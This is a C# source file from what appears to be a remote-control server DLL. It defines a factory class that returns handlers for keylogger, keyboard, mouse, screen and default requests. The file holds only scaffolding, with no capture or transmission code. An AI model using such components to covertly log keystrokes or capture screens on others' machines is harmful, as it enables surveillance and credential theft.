using System;
using System.Collections.Generic;
using System.Text;
using SCF= ServerDLL.CommandHandler.File;
namespace ServerDLL.CommandHandler.Factory
{
    internal sealed class FileHandlerFactory : AbstractHandlerFactory 
    {

        internal override AbstractCommandHandler GetKeyLoggerRequestHandler()
        {
            return new SCF.KeyLoggerRequestHandler();
        }

        internal override AbstractCommandHandler GetKeyBoardRequestHandler()
        {
            return new SCF.KeyBoardRequestHandler();
        }

        internal override AbstractCommandHandler GetMouseRequestHandler()
        {
            return new SCF.MouseRequestHandler(); 
        }

        internal override AbstractCommandHandler GetScreenRequestHandler()
        {
            return new SCF.ScreenRequestHandler();
        }

        internal override AbstractCommandHandler GetDefaultRequestHandler()
        {
            return new SCF.DefaultRequestHandler();
        }
    }
}
